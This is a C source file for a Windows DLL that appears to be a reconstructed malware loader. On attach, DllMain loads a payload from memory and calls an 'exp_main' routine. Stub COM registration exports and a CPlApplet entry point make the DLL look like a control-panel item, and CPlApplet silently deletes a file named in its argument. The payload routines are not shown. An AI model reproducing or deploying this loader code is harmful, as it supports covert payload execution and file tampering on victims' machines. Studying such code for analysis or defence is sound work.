#include"include.h"

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	if (ul_reason_for_call == DLL_PROCESS_DETACH)
	{
		OutputDebugString(L"dll uninstall");
		return TRUE;
	}
	if (!ul_reason_for_call || ul_reason_for_call != DLL_PROCESS_ATTACH)
		return TRUE;
	
	DisableThreadLibraryCalls(hModule);
	
	if (LoadFromMemory())
	{
		OutputDebugString(L"call hook exp");
		return exp_main();
		//return TRUE;
	}
	OutputDebugString(L"call memory load end!");
	return TRUE;
}

HRESULT __stdcall DllUnregisterServer(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	OutputDebugString(L"DllUnregisterServer");
	return 0;
}

HRESULT __stdcall DllCanUnloadNow(void)
{
	OutputDebugString(L"DllCanUnloadNow");
	return 0;
}

HRESULT __stdcall DllGetClassObject(const IID* const rclsid, const IID* const riid, LPVOID* ppv)
{
	OutputDebugString(L"DllGetClassObject");
	return 0;
}

// 100% (C) CODE MATCH
HRESULT __stdcall DllRegisterServer(void)
{
	OutputDebugString(L"DllRegisterServer");
	return 1;
}

// 100% (C) CODE MATCH
LONG APIENTRY CPlApplet(HWND hwndCPl, UINT uMsg, LPARAM lParam1, LPARAM lParam2)
{
	OutputDebugString(L"CPlApplet");
	if (*(DWORD*)(hwndCPl + 2))
		DeleteFileA(*(LPCSTR*)(hwndCPl + 2));
	return 1;
}